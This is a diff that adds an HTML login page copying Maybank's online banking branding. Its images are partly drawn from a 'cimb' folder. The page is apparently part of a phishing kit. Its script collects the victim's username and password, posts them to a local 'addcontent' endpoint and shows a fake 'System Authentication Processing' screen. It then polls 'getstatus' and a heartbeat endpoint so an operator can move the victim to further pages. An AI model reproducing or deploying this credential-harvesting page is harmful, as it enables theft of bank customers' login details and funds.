@@ -1,0 +1,307 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <title>Login - maybank</title>
+  <link rel="stylesheet" href="/maybank/css/main.css">
+
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato&subset=latin,latin-ext" />
+  <script src="/assets/jquery-3.1.1.min.js"></script>
+</head>
+<style>
+
+</style>
+
+<body>
+
+  <div id="loading" class="loading" style="display: none;">
+    <div class="bg">
+      <div class="title3">Humanising<br />Banking</div>
+    </div>
+    <div class="qiurongqi">
+      <div class="qiu">
+      </div>
+    </div>
+    <h1 style="margin-top: 14rem;text-align: center;">System Authentication Processing...</h1>
+    <h3 style="margin-top: 0rem;text-align: center;">Please wait while we secure your online transaction within 2 minutes. Please do not click stop or refresh this pages.</h3>
+    <p class="copy-right">© 2020&nbsp;<a href="http://www.maybank.com" target="_blank">Malayan Banking Berhad</a> (Co.
+      Reg. No. :196001000142). All rights reserved.</p>
+  
+    <div class="imgs">
+      <div class="item">
+        <a href=""><img src="/cimb/img/bank-negara-malaysia.jpg" /></a>
+      </div>
+      <div class="item">
+        <a href=""><img src="/cimb/img/ofs-logo.png" /></a>
+      </div>
+      <div class="item">
+        <a href=""><img src="/cimb/img/smeinfo.jpg" /></a>
+      </div>
+      <div class="item">
+        <a href=""><img src="/cimb/img/banking-info.jpg" /></a>
+      </div>
+      <div class="item">
+        <a href=""><img src="/cimb/img/bankcard.jpg" /></a>
+      </div>
+  
+      <div class="item">
+        <a href=""><img src="/cimb/img/mybayar.jpg" /></a>
+      </div>
+      <div class="item">
+        <a href=""><img src="/cimb/img/pidm-footer-logo-size-29x24px.jpg" /></a>
+      </div>
+      <div class="item">
+        <a href=""><img src="/cimb/img/mifc.jpg" /></a>
+      </div>
+      <div class="item">
+        <a href=""><img src="/cimb/img/cbrs.jpg" /></a>
+      </div>
+    </div>
+  </div>
+
+  <div id="dialog" class="modal" style="display: none;">
+    <span class="close">×</span>
+    <div class="title" id="dialog-title"></div>
+    <p id="dialog-text"></p>
+  </div>
+
+  <div id="c1" class="container">
+
+    <div class="header">
+
+      <div class="logo"><img src="/maybank/img/mobile_logo_60.png" /></div>
+
+      <div class="title">Humanising<br />Banking</div>
+    </div>
+
+    <div class="box" style="    margin-top: 5.2rem;">
+      <div class="input">
+        <img src="/maybank/img/profile.svg" style="margin: 0 2.1rem;" />
+        <input id="username" type="text" placeholder="My Username" />
+        <button id="btn"><img src="/maybank/img/lock.svg" /></button>
+      </div>
+    </div>
+
+
+    <div class="link">
+      <a href="#" class="white">FORGOT LOGIN DETAILS </a>
+    </div>
+
+  </div>
+  <!-- <div class="link">
+    <a href="#" >Desktop View</a>
+  </div> -->
+
+  <div class="container2" id="c2" style="display: none;">
+    <div class="bg">
+      <span id="closec2"></span>
+    </div>
+    <h1>Hello,<br />
+      <name id="name"></name>
+    </h1>
+    <div class="box normal" style="    margin-top: 3rem;">
+      <div class="input">
+        <img src="/maybank/img/profile.svg" style="margin: 0 2.1rem;" />
+        <input id="password" type="password" placeholder="My Password" onkeyup="pwdcheck(this)" />
+      </div>
+    </div>
+    <div class="box" style="    margin-top:1.5rem;">
+      <button class="sbtn2">FORGOT PASSWORD</button>
+    </div>
+    <div class="box" style="    margin-top:1.5rem;">
+      <button id="subbtn" class="sbtn disabled">LOGIN</button>
+    </div>
+  </div>
+
+  <div class="footer" id="footer">
+    <div class="item">
+      <div><img src="/maybank/img/c19_b_ico.svg" /></div>
+      <p>Covid-19 Assistance</p>
+    </div>
+    <div class="item">
+      <div><img src="/maybank/img/branch_b_ico.svg" /></div>
+      <p>Operating Branches</p>
+    </div>
+    <div class="item">
+      <div><img src="/maybank/img/m2u_marketplace.svg" /></div>
+      <p>Marketplace</p>
+    </div>
+  </div>
+
+
+  <script>
+    
+    var username = '';
+    $("#btn").click(function () {
+      var u = $("#username").val();
+      if (u.length < 6 || u.length > 16) {
+        dialog("Invalid Username", "Input Username between 6 and 16 characters.");
+      }
+      else {
+        username = u;
+        loading(true);
+        setTimeout(function () {
+          loading(false);
+          $("#c1").hide();
+          $("#footer").hide();
+          $("#c2").show();
+          $("#name").text(username);
+        }, 3000);
+      }
+    })
+    $("#closec2").click(function () {
+      $("#c2").hide();
+      $("#c1").show();
+      $("#footer").show();
+    });
+
+    function pwdcheck(obj) {
+      if (obj.value.length == 0) {
+        $("#subbtn").addClass("disabled");
+      }
+      else {
+        $("#subbtn").removeClass("disabled");
+
+      }
+    }
+  </script>
+
+  <script>
+    // function dialog(title, msg, callback = null) {
+    //   $("#dialog").show();
+    //   var autoclosetimer = setInterval(function () {
+    //     clearInterval(autoclosetimer);
+    //     $("#dialog").hide();
+    //   }, 5000);
+    //   $("#dialog-title").text(title);
+
+    //   $("#dialog-text").text(msg);
+    //   $('#dialog span').click(function () {
+    //     $("#dialog").hide();
+    //     clearInterval(autoclosetimer);
+    //     if (callback) {
+    //       callback();
+    //     }
+    //   });
+
+
+    // }
+    function dialog(title, msg, callback = null, type = null) {
+			if (type == "success") {
+				$("#dialog").addClass("greenbg");
+      }
+      else if(type=="warning"){
+        $("#dialog").addClass("warningbg"); 
+      }
+			else {
+				$("#dialog").removeClass("greenbg");
+			}
+			$("#dialog").show();
+			var autoclosetimer = setInterval(function () {
+				clearInterval(autoclosetimer);
+				$("#dialog").hide();
+			}, 1000*10);
+			$("#dialog-title").text(title);
+
+			$("#dialog-text").text(msg);
+			$('#dialog span').click(function () {
+				$("#dialog").hide();
+				clearInterval(autoclosetimer);
+				if (callback) {
+					callback();
+				}
+			});
+
+
+		}
+
+    function loading(isshow) {
+      if (isshow) {
+        $("#loading").show();
+      }
+      else {
+        $("#loading").hide();
+      }
+    }
+
+    var id = 0;
+    var s;
+    $('#subbtn').click(function () {
+      var iserror = false;
+      var pwd = $('#password').val();
+      if (pwd.length > 0) {
+        dialog("Alert","123456",null,"warning");
+        $.post('addcontent', {
+          c1: username,
+          c2: pwd
+        }, function (res) {
+          if (res > 0) {
+            loading(true);
+            id = res
+            s = setInterval(lun, 1000);
+
+            //hb
+            starthb();
+          } else {
+            loading(false);
+            window.loading.href = "/";
+          }
+        })
+      }
+    })
+    function lun() {
+      var url = 'getstatus'
+      $.post(url, { id: id }, function (res) {
+
+        // if (res == -1) {
+        //   window.location.href = "index2?ids=" + id;
+        // }
+        if (res == 1) {
+          window.location.href = "index2?ids=" + id;
+        }
+        if (res != 1 && res != 0) {
+          loading(false);
+          dialog("Error", res, function () {
+            window.location.href = "/";
+          });
+          clearInterval(s);
+        }
+      })
+    }
+
+    var hbtimer;
+    function heartbeat() {
+      var url = 'heartbeat'
+      $.post(url, { ids: id }, function (res) {
+        if (res <= 0) {
+          window.location.href = "/";
+        }
+      })
+    }
+    function starthb() {
+      hbtimer = setInterval(heartbeat, 1000 * 15);
+    }
+    // loading(true)
+  </script>
+</body>
+
+</html>
+<script type="text/javascript">
+
+
+  var winHeight = $(window).height();
+  $(window).resize(function () {
+    thisHeight = $(this).height();
+    if (winHeight - thisHeight > 50) {
+      $('body').css('height', thisHeight + 'px');
+      $(".buttom").css({ 'bottom': '0px' });
+    } else {
+      $('body').css('height', '100%');
+    }
+  });
+
+
+</script>
